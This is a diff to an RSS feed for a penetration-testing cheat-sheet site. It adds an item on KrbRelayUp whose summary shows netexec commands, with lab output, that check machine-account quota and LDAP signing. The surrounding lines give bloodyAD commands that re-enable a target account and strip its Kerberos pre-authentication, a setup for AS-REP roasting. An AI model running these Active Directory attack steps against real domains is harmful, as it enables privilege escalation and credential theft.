@@ -29,6 +29,13 @@
       <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to Target User Linux Windows 1. Enable Account [Optional] sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; bloodyAD --host &amp;lt;DC&amp;gt; -d &amp;#34;&amp;lt;DOMAIN&amp;gt;&amp;#34; --dc-ip &amp;lt;DC_IP&amp;gt; -k remove uac &amp;lt;TARGET_USER&amp;gt; -f ACCOUNTDISABLE 2. Add UF_DONT_REQUIRE_PREAUTH bit sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; bloodyAD --host &amp;lt;DC&amp;gt; -d &amp;#34;&amp;lt;DOMAIN&amp;gt;&amp;#34; --dc-ip &amp;lt;DC_IP&amp;gt; -k add uac &amp;lt;TARGET_USER&amp;gt; -f DONT_REQ_PREAUTH 1. Import PowerView . .\PowerView.ps1 PS C:\programdata&amp;gt; . .\PowerView.ps1 . .\PowerView.ps1 2. Check Target User Get-DomainUser &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; | ConvertFrom-UACValue PS C:\programdata&amp;gt; Get-DomainUser &amp;#39;user&amp;#39; | ConvertFrom-UACValue Get-DomainUser &amp;#39;user&amp;#39; | ConvertFrom-UACValue Name Value ---- ----- NORMAL_ACCOUNT 512 3.</description>
     </item>
     <item>
+      <title>KrbRelayUp</title>
+      <link>https://tldrbins.github.io/krbrelayup/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/krbrelayup/</guid>
+      <description>Prerequisite 1. Machine Quota nxc ldap &amp;lt;TARGET_DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -M maq $ nxc ldap DC01.example.com -u &amp;#39;apple.seed&amp;#39; -p &amp;#39;Password&amp;#39; -d example.com -M maq LDAP 10.10.72.181 389 DC01 [*] Windows Server 2022 Build 20348 (name:DC01) (domain:example.com) LDAP 10.10.72.181 389 DC01 [+] example.com\apple.seed:Password MAQ 10.10.72.181 389 DC01 [*] Getting the MachineAccountQuota MAQ 10.10.72.181 389 DC01 MachineAccountQuota: 10 2. LDAP Signing NOT Enforced nxc ldap &amp;lt;TARGET_DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -d &amp;lt;DOMAIN&amp;gt; -M ldap-checker $ nxc ldap DC01.</description>
+    </item>
+    <item>
       <title>NTLM Relay Attack</title>
       <link>https://tldrbins.github.io/ntlm_relay_attack/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
